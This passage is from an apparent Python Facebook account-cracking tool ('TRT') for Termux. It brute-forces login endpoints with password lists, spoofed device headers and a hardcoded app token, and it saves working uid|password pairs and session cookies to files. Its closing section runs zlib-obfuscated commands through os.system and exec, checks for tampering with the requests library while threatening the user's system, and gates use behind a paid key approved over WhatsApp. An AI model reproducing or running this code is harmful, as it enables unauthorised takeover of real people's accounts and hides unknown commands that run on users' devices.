'X-FB-Net-HNI': '45204',

'X-FB-SIM-HNI': '45201',

'X-FB-Connection-Type': 'MOBILE.LTE',

'X-Tigon-Is-Retry': 'False',

'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',

'x-fb-device-group': '5120',

'X-FB-Friendly-Name': 'ViewerReactionsMutation',

'X-FB-Request-Analytics-Tags': 'graphservice',

'X-FB-HTTP-Engine': 'Liger',

'X-FB-Client-IP': 'True',

'X-FB-Server-Cluster': 'True',

'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',

'Content-Length': '698'}

                        url = 'https://b-graph.facebook.com/auth/login'

                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'

                        po = requests.post(url,data=data,headers=headers).json()

                        if 'session_key' in po:

                                try:

                                        uid = po['uid']

                                except:

                                        uid = ids

                                if str(uid) in oks:

                                        break

                                else:

                                        print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')

                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')

                                        oks.append(str(uid))

                                        break

                        elif 'www.facebook.com' in po['error']['message']:

                                try:

                                        uid = po['error']['error_data']['uid']

                                except:

                                        uid = ids

                                if uid in oks:pass

                                else:

                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')

                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')

                                        cps.append(str(ids))

                                        break

                        else:continue

                loop+=1

        except Exception as e:

                pass

def trt2(ids,passlist):

	global loop

	global oks

	try:

		for pas in passlist:

			sys.stdout.write('\r\r\033[1;37m [TRT-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()

			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))

			application_version_code=str(random.randint(000000000,999999999))

			__iam_genius = random.choice(android_models)

			phone_model = __iam_genius.split('|')[0]

			phone_company = __iam_genius.split('|')[1]

			dimensions = __iam_genius.split('|')[2]

			ffb=random.choice(fbks)

			dvlk = random.choice(usr)

			#1 method issue es ma ha

			ua_string = 'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X690B Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/236.0.0.24.108;FBBV/405428495;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X690B;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.97,width=720,height=1612};FB_FW/1;]'

			device_family_id = str(uuid.uuid4())

			adid = str(uuid.uuid4())

			machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))

			data = {'adid':adid,

				'format':'json',

				'device_id':device_family_id,

				'email':ids,

				'password':pas,

				'generate_analytics_claim':'1',

				'community_id':'','cpl':'true','try_num':'1',

				'family_device_id':device_family_id,

				'credentials_type':'device_based_login_password',

				'generate_session_cookies':'1',

				'error_detail_type':'button_with_disabled',

				'source':'device_based_login',

				'machine_id':machine_id,

				'login_location_accuracy_m':'1.0',

				'meta_inf_fbmeta':'',

				'advertiser_id':adid,

				'encrypted_msisdn':'',

				'currently_logged_in_userid':'0',

				'locale':'en_PK',

				'client_country_code':'PK',

				'method':'auth.login',

				'fb_api_req_friendly_name':'authenticate',

				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',

				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}

			head = {

				'content-type':'application/x-www-form-urlencoded',

				'x-fb-sim-hni':str(random.randint(2e4,4e4)),

				'x-fb-connection-type':'unknown',

				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',

				'api_key': '8114af471d039628db5c68cb127af936',

				'user-agent':aqib_ua,

				'x-fb-net-hni':str(random.randint(2e4,4e4)),

				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),

				'x-fb-connection-quality':'EXCELLENT',

				'x-fb-friendly-name':'authenticate',

				'accept-encoding':'gzip, deflate',

				'x-fb-http-engine':	'Liger'}

			url = 'https://b-api.facebook.com/method/auth.login'

			po = requests.post(url,data=data,headers=head,allow_redirects=False).text

			q = json.loads(po)

			if 'session_key' in q:

				udx = str(q['uid'])

				print('\r\r\033[1;32m [TRT-OK] '+udx+' | '+pas+'\033[1;97m')

				open('/sdcard/TRT-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')

				oks.append(ids)

				break

			elif 'www.facebook.com' in q['error_msg']:

				print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')

				open('/sdcard/TRT-rnd-CP.txt','a').write(ids+'|'+pas+'\n')

				cps.append(ids)

				break

			else:

				continue

		loop+=1

	except requests.exceptions.ConnectionError:

		time.sleep(10)

	except Exception as e:

		print(e)

#new method

                

def trt3(ids,passlist):

        global loop

        global oks

        sys.stdout.write('\r\r\033[1;37m [TRT-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()

        try:

                for pas in passlist:

                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'

                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'

                        fbbv = str(random.randint(111111111,999999999))

                        android_version = device['android_version']

                        model = device['model']

                        build = device['build']

                        fblc = device['fblc']

                        fbcr = sim_id

                        fbmf = device['fbmf']

                        fbbd = device['fbbd']

                        fbdv = device['fbdv']

                        fbsv = device['fbsv']

                        fbca = device['fbca']

                        fbdm = device['fbdm']

                        fbfw = '1'

                        fbrv = '0'

                        fban = 'FB4A'

                        fbpn = 'com.facebook.katana'

                        en = random.choice(['en_US','en_GB'])

                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])

                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])

                        ua = "Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=2.25,width=720,height=1452};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"

                               

                        random_seed = random.Random()

                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))

                        device_id = str(uuid.uuid4())

                        secure = str(uuid.uuid4())

                        family = str(uuid.uuid4())

                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'

                        xd =str(''.join(random_seed.choices(string.digits, k=20)))

                        sim_serials = f'["{xd}"]'

                        li = ['28','29','210']

                        li2 = random.choice(li)

                        j1 = ''.join(random.choice(digits) for _ in range(2))

                        jazoest = li2+j1

                        data = {

                                'adid':adid,

                                'format':'json',

                                'device_id':device_id,

                                'email':ids,

                                'password':pas,

                                'generate_analytics_claims':'1',

                                'credentials_type':'password',

                                'source':'login',

                                'error_detail_type':'button_with_disabled',

                                'enroll_misauth':'false',

                                'generate_session_cookies':'1',

                                'generate_machine_id':'1',

                                'fb_api_req_friendly_name':'authenticate',

                        }

                        headers={

                                'Authorization':f'OAuth {accessToken}',

                                'X-FB-Friendly-Name':'authenticate',

                                'X-FB-Connection-Type':'unknown',

                                'User-Agent':aqib_ua,

                                'Accept-Encoding':'gzip, deflate',

                                'Content-Type': 'application/x-www-form-urlencoded',

                                'X-FB-HTTP-Engine': 'Liger'

                                }

                        url = 'https://b-graph.facebook.com/auth/login'

                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'

                        po = requests.post(url,data=data,headers=headers).json()

                        if 'session_key' in po:

                                try:

                                        uid = po['uid']

                                except:

                                        uid = ids

                                if str(uid) in oks:

                                        break

                                else:

                                        print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')

                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])

                                        #print("\r\r\033[1;33m Cookie: "+coki)

                                        #open('/sdcard/TRT-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')

                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')

                                        oks.append(str(uid))

                                        break

                        elif 'www.facebook.com' in po['error']['message']:

                                try:

                                        uid = po['error']['error_data']['uid']

                                except:

                                        uid = ids

                                if uid in oks:pass

                                else:

                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')

                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')

                                        cps.append(str(ids))

                                        break

                        else:continue

                loop+=1

        except Exception as e:

                pass

#method4

def trt4(ids,passlist):

        global loop

        global oks

        sys.stdout.write('\r\r\033[1;37m [TRT-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()

        try:

                for pas in passlist:

                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'

                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'

                        fbbv = str(random.randint(111111111,999999999))

                        android_version = device['android_version']

                        model = device['model']

                        build = device['build']

                        fblc = device['fblc']

                        fbcr = sim_id

                        fbmf = device['fbmf']

                        fbbd = device['fbbd']

                        fbdv = device['fbdv']

                        fbsv = device['fbsv']

                        fbca = device['fbca']

                        fbdm = device['fbdm']

                        fbfw = '1'

                        fbrv = '0'

                        fban = 'FB4A'

                        fbpn = 'com.facebook.katana'

                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=3130};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'

                        random_seed = random.Random()

                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))

                        device_id = str(uuid.uuid4())

                        secure = str(uuid.uuid4())

                        family = str(uuid.uuid4())

                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'

                        xd =str(''.join(random_seed.choices(string.digits, k=20)))

                        sim_serials = f'["{xd}"]'

                        li = ['28','29','210']

                        li2 = random.choice(li)

                        j1 = ''.join(random.choice(digits) for _ in range(2))

                        jazoest = li2+j1

                        data = {

                                'adid':adid,

                                'format':'json',

                                'device_id':device_id,

                                'email':ids,

                                'password':pas,

                                'generate_analytics_claims':'1',

                                'credentials_type':'password',

                                'source':'login',

                                'error_detail_type':'button_with_disabled',

                                'enroll_misauth':'false',

                                'generate_session_cookies':'1',

                                'generate_machine_id':'1',

                                'fb_api_req_friendly_name':'authenticate',

                        }

                        headers={

                                'Authorization':f'OAuth {accessToken}',

                                'X-FB-Friendly-Name':'authenticate',

                                'X-FB-Connection-Type':'unknown',

                                'User-Agent':aqib_ua,

                                'Accept-Encoding':'gzip, deflate',

                                'Content-Type': 'application/x-www-form-urlencoded',

                                'X-FB-HTTP-Engine': 'Liger'

                                }

                        url = 'https://b-graph.facebook.com/auth/login'

                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'

                        po = requests.post(url,data=data,headers=headers).json()

                        if 'session_key' in po:

                                try:

                                        uid = po['uid']

                                except:

                                        uid = ids

                                if str(uid) in oks:

                                        break

                                else:

                                        print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')

                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])

                                        print("Cookie: "+coki)

                                        open('/sdcard/TRT-COOKIE.txt','a').write(coki+'\n')

                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')

                                        oks.append(str(uid))

                                        break

                        elif 'www.facebook.com' in po['error']['message']:

                                try:

                                        uid = po['error']['error_data']['uid']

                                except:

                                        uid = ids

                                if uid in oks:pass

                                else:

                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')

                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')

                                        cps.append(str(ids))

                                        break

                        else:continue

                loop+=1

        except Exception as e:

                pass

#method5

def trt5(ids,passlist):

        global loop

        global oks

        sys.stdout.write('\r\r\033[1;37m [TRT-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()

        try:

                for pas in passlist:

                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'

                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'

                        fbbv = str(random.randint(111111111,999999999))

                        android_version = device['android_version']

                        model = device['model']

                        build = device['build']

                        fblc = device['fblc']

                        fbcr = sim_id

                        fbmf = device['fbmf']

                        fbbd = device['fbbd']

                        fbdv = device['fbdv']

                        fbsv = device['fbsv']

                        fbca = device['fbca']

                        fbdm = device['fbdm']

                        fbfw = '1'

                        fbrv = '0'

                        fban = 'FB4A'

                        fbpn = 'com.facebook.katana'

                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2246};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'

                        random_seed = random.Random()

                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))

                        device_id = str(uuid.uuid4())

                        secure = str(uuid.uuid4())

                        family = str(uuid.uuid4())

                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'

                        xd =str(''.join(random_seed.choices(string.digits, k=20)))

                        sim_serials = f'["{xd}"]'

                        li = ['28','29','210']

                        li2 = random.choice(li)

                        j1 = ''.join(random.choice(digits) for _ in range(2))

                        jazoest = li2+j1

                        data = {

                                'adid':adid,

                                'format':'json',

                                'device_id':device_id,

                                'email':ids,

                                'password':pas,

                                'generate_analytics_claims':'1',

                                'credentials_type':'password',

                                'source':'login',

                                'error_detail_type':'button_with_disabled',

                                'enroll_misauth':'false',

                                'generate_session_cookies':'1',

                                'generate_machine_id':'1',

                                'fb_api_req_friendly_name':'authenticate',

                        }

                        headers={

                                'Authorization':f'OAuth {accessToken}',

                                'X-FB-Friendly-Name':'authenticate',

                                'X-FB-Connection-Type':'unknown',

                                'User-Agent':aqib_ua,

                                'Accept-Encoding':'gzip, deflate',

                                'Content-Type': 'application/x-www-form-urlencoded',

                                'X-FB-HTTP-Engine': 'Liger'

                                }

                        url = 'https://b-graph.facebook.com/auth/login'

                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'

                        po = requests.post(url,data=data,headers=headers).json()

                        if 'session_key' in po:

                                try:

                                        uid = po['uid']

                                except:

                                        uid = ids

                                if str(uid) in oks:

                                        break

                                else:

                                        print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')

                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')

                                        oks.append(str(uid))

                                        break

                        elif 'www.facebook.com' in po['error']['message']:

                                try:

                                        uid = po['error']['error_data']['uid']

                                except:

                                        uid = ids

                                if uid in oks:pass

                                else:

                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')

                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')

                                        cps.append(str(ids))

                                        break

                        else:continue

                loop+=1

        except Exception as e:

                pass

#method6

def trt6(ids,passlist):

	global loop

	global oks

	try:

		for pas in passlist:

			sys.stdout.write('\r\r\033[1;37m [TRT-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()

			session = requests.Session()

			pro = random.choice(ruz)

			free_fb = session.get('https://p.facebook.com').text

			log_data = {

				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

			"try_number":"0",

			"unrecognized_tries":"0",

			"email":ids,

			"pass":pas,

			"login":"Log In"}

			header_freefb = {'authority':'free.facebook.com',

			'method': 'GET',

			'scheme': 'https',

			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',

            'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',

            'cache-control': 'max-age=0',

            'referer': 'https://free.facebook.com/login.php?next=https%3A%2F%2Ffree.facebook.com%2Fgettingstarted%2F%3Feav%3DAfZK_OXO2-tCqThnPaaQirDidiOVilfarzsueC38GRerDEnApqlf3gVqKS2-MDaj4cQ%26paipv%3D0&refsrc=deprecated&_rdr',

            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',

            'sec-ch-ua-mobile': '?1',

            'sec-ch-ua-model': '"V2031"',

           'sec-ch-ua-platform': '"Android"',

           'sec-fetch-dest': 'document',

          'sec-fetch-mode': 'navigate',

          'sec-fetch-site': 'same-origin',

          'sec-fetch-user': '?1',

          'upgrade-insecure-requests': '1',

          'user-agent': 'Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1',}

			lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text

			log_cookies=session.cookies.get_dict().keys()

			if 'c_user' in log_cookies:

				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

				uid = coki[151:166]

				if uid in oks:pass

				else:

					if 'checkpoint' in str(lo):

						print('\r\r\033[1;34m [TRT-2F] '+uid+' | '+pas)

					else:

						print(f'\r\x1b[1;32m [TRT-OK] '+uid+' | '+pas)

						#cek_apk(session,coki)

						open('/sdcard/TRT-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')

						oks.append(uid)

						break

			elif 'checkpoint' in log_cookies:

				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

				uid=coki[141:156]

				if uid in cps:pass

				else:

					print('\r\r\x1b[38;5;205m [TRT-CP] '+uid+' | '+pas+'\033[1;97m')

					open('/sdcard/TRT-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')

					cps.append(ids)

					break

			else:

				continue

		loop+=1

	except requests.exceptions.ConnectionError:

		time.sleep(10)

	except:

		pass

import os

import os

try:

	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct

	from string import *

	from concurrent.futures import ThreadPoolExecutor as ThreadPool

except(ImportError):

    os.system("pip install requests")

    pass

import os,sys

os.system("clear")

print(" Checking Security...")

import os,shutil,zlib,time

sz = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x19\xf9\xb9\xa9\xfae\x05E\xf9%\xa9\xc9%\x00<J\x0f\x94')

sz1 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x0eL\x0e\x15')

sz2 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x0eK\x0e\x19')

sz3 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x89g\xfca\xa4\xa7@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc8\xa7\xdd\x00M\xaf\xf8\xa8<|s\x13\xcdsP\x06c\x9e\x1d\xa5\xecg[\xd7\xeb\x05\x14#z\xaa\x03\xfd\x0c\xcb\x0c\xd8\x13\xd3\x9fo\x8c\x14\xed\xfeF\xa9M\x0cn\x8a\xed7?\xf1Q&+')

sz4 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x13\xcf\xf8\xc3HO@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc9\x87\xdd\x00M\xafxT\x9e\xbe\xb9\x89\xe69(\x831\xcf\x8eR\xf6g[\xd7\xeb\x05\x14#z\xaa\x03\xda\xc32\x03\xf6\xc4\xf4\xe7\x1b#E\xbb\xbfQj\x13\x83\x9bb\xfb\xcd\x0f\xf0\xab&#')

sz5 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x90\xf4\x11\x05')

sz6 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x90\xf3\x11\t')

sz7 = zlib.decompress(b'x\x9c\x1d\xca[\x0e@0\x10\x05\xd0\x15\xe9%V4j\xd0\xb4\xd5\x9aG\xc2\xee\x89\x9f\xf3u\xb0\x92\x11~b\xab\xc1X\xaa\xdf\xd8Ra\x85\xab\xa0\xa4\x05\xfd\xb1\xa3\x9ds\x98Fh2\x1e:\xc5L\xfb\x17\x84/g5\xc5\x0b\x8bO\x19\xc2')

#--checking if file is not avalible

if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):

        pass

        exit("Error in termux modules ")

if os.path.exists(sz):

        os.rename(sz1,'.f1')

        os.rename(sz2,'.f2')

        os.system(sz3)

        os.system(sz4)

        os.system(sz5)

        os.system(sz6)

else:

        pass

if not str(len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py','r').readlines()))=='1034':

	time.sleep(0);print('Final Warning If You Try Again Your System Will be Fucked Bye Mr TRT');exit()

try:

	import pyrebase

except:

	if not os.path.exists('.n'):

		print('\033[1;91m[\033[1;97m!\033[1;91m] \033[1;97mInstalling Module Pyrebase')

		os.system('pip install git+https://github.com/heston/Pyrebase.git@a77bd6f6def656b1dcd77d938fac2707f3c4ba61#egg=Pyrebase')

		exit()

def approval():

  os.system('clear')

  print(logo)

  uuid = str(os.geteuid()) + str(os.getlogin())

  id = "-".join(uuid)

  sxb = 'TRT'

  try:

    httpCaht = requests.get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O\xcf,\xc9(M\xd2K\xce\xcf\xd5\xcf\xceH\xcc+*\xd1O,(\xd2O\xca\xc9O\xd2\xcfM\xcc\xcc\x03\xf1\xf4J*J\x00\xa3!\x11\x87')).text

    if id in httpCaht:

      print("\033[1;32mYour Key is Successfully Approved")

      time.sleep(0.5)

      msg = str(os.geteuid())

      menu()

      pass

    else:

      print("\033[1;91m YOUR KEY \033[1;37m : \033[1;32m"+id+'-'+sxb)

      #print('\033[1;37m----------------------------------------------')

    #  print("Note : Tool is Paid & We Accept All Types Of PAyment  Method . If There was Fb Update & Tool Wasnt Run Then We Are Not Responsible For All Of This . We Will Try  To Update Script Every Time But It Took Day ")

   #   print('\033[1;37m----------------------------------------------')

 #     print(" 15-Days Price   : 350")

  #    print(" 1-Month Price   : 500")

   #   print(" Other Countries : 5$ for Weekly  "#)

 #     print(" Other Countries : 15$ For Monthly")

    #  print('\033[1;37m----------------------------------------------')

 #     print(" Easypaisa  Number     : +923118933642")

  #    print(" Trust Wallet Address : 0xb785952B2825366c8756fb65520F7Df8e0D145bD ")

      input('\033[1;37m Press Enter For Contact To Admin ')

      tks = ('Hello%20MR-RAMZAN%20Sir%20!%20Please%20Approve%20My%20Key%20The%20TRT%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+923309580245?text='+tks)

      time.sleep(1)

      approval()

  except:

    sys.exit()

import zlib

exec(zlib.decompress(b'x\x9ce\x8fMO\x83@\x10\x86\xef\xfc\n\xc2\xa5\x17i\xf9\xdc\x08\x89\x87\x9a\x1a%R\xa3%\x8d\x1f\xb7\x81\x1d\xe8JaWv\x11[\xe3\x7f\x17\x8a\xb1\x8d^\xe7\x9d\xe7\x99w2^\xe7\xac\xd0/\xf4OM\xd7\r\x10\xec\x16wF\xa8\x1b\xf3h\x0f\xc9n\xbe\xfaX\x80(\xad\xab\xa7x\xbb\xb6\xee:\xf6\xd6Q\x19\xbd\xdcp\xf7\xbdxL\x8a{\xcf8;`\xad\xda,x\x05\xac\x1e\xd0\x8c\xf3\x92\xa1Ir\x82\xee4g\r\xa6 \x11\x84\x98f\xbc\x1a\xf7)(\x18\x86\xebU<\x00\x1b\xa5\x84\x0cg\xb3S\xd0\xa4\x98C\xbbUf\xa3h\xfaka\xfc(\x11\r\x7f\xc5LE\xf4\xef\xcd1\x96\x8a7P\xe0e\x9b\x95\xa8\xfe\xd5\xea\xebH\xc1\xd5\xd1V\xa1\x94P\xb0\xbaH\xb0\xa6\xd8\x8cV\xdf"\x8e\xef\x11\xdb\'^\xf0\xf3\xa9\x10cd\x87\xa7a\xd8a\x1a\xfa\x0e\x10+H\xd3<p\xa8\xe3\x00\x12\xdf%\x8eu\xe0&\x15\x82l\x1b\xac\xb0\xee\x0bOz\xfe\xda\xb4\xcfm\xdf[>\xc7\xcb\x07C\xfb\xd2\xbe\x01\xc1Av$'))

from zlib import decompress as d

exec(d(b'x\x9c}\xceI\x8f\xa3h\x12\x06\xe0{\xff\nK}\xa8L\xa1*\xc0f\xcdQ\x1d\x8c\xd91\x9b\xd9i\xb5R`\xf6\x9d\x0f0\xcb\xafo\xcfe4s\x998\x85\xe2y#\x14\x7f\x9e\xf48[\xa6g4\xa7\xc9i-\xe7\xe2d\xec\xff\x99\xfc\xf1\xe7\xa9\x98\xe7a\xfa\x82\xe1u]\x7f\xe5o^\xe2_\xcf\xbe\x85\x8b\x19\xfc\x9c\xd3g\xf1N\xd8e\x9b\x9e\xbeN<(Or\xd4\x9d\xce\xc8\t\xc5\xbf.\xf4\x17\x8a\xbd\xfb\xf3\xe5\x9d\xf8\xf9\xff\xeb\x8f\xef\xd3\xefS\x13\xb5q\x12\x9d\xbe\xbf\xdf\xa7\xbe\xbf\xcbv\xe8\xc1\xfc\xfd\xfd\xf1\xa3\x8d\xc0TD\xcd\x8f\xcf_M\x1f%\xd3\xc7\x7f\xdb\xd1\x94\xf1\x1b\x92\xf4\xfd\xd1\x00\xd2\xe9\x7f5\x8e\xa6\x94\xc0\xde\x1e\x13\xd8\xbf#I\xfa\xe6\xbf\xbe\xbe~\xa2\x7f\x7f~~\xfe+\xdd\xd2\xe7\xc7\xc7\xf7\xe7G\xfc\xe3\xf7\xef\xab\xb8\x8d~\xc7S\xb0\xe5O\xbe\xe9?V\xf4F\xda;\x82)\xc8\xc1\xa8\x1e\xf3\xc8\x9d\x9e\xf7\xca\x8a\xd5C\xc2\xee4Dy\xa9\x1e\xc6\xc4I\x06q\x02\xb1\x12\x9dA\xef\x0cL\xe74e[\x04\x83\x96\x94\xc8\x1d\x1a\x9e\x9b\xa6\xde2\x03\xcd\x8e\xb9/\xa3"\x939\x87\x8e\x84\x97TH\x13\xa0\xabb\xd4o\xe4\nc\x89\x1b\xc6\x85\xb8\xd2O\xc6$`8\xc0:\x06\rP=|\xae\x15\xcer\x82\xba\xa8\x03T\\\xc0\xe8\xd0\xe4\x9e\xf14 